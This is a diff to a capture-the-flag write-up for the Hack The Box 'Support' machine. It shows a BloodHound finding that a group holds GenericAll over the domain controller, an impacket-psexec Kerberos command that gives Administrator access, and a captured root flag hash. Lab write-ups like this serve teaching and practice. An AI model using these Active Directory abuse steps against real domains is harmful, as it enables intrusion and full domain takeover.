@@ -173,7 +173,7 @@ c2ee84b4277d7cab7ea5ae7d9bc1d5bc
 ### BloodHound Enumeration
 
 * `support` user → member of **SHARED SUPPORT ACCOUNTS** group
-* This group has **GenericAll** on `DC.support.htb` computer object.
+* This group has **GenericAll** on `DC.SUPPORT.HTB` computer object.
 
 ![BloodHound Enumeration](ScreenShots/support-user-bloodhound.png)
 
@@ -205,8 +205,8 @@ impacket-psexec -k -no-pass support.htb/Administrator@DC.support.htb
 ```
 
 ```
-C:\Windows\system32> whoami
-nt authority\system
+C:\Users\Administrator\Desktop> type root.txt
+ae1605fecb42f57a3d34817e12d24252
 ```
 
 * **Result:** Full SYSTEM access (Domain Admin).
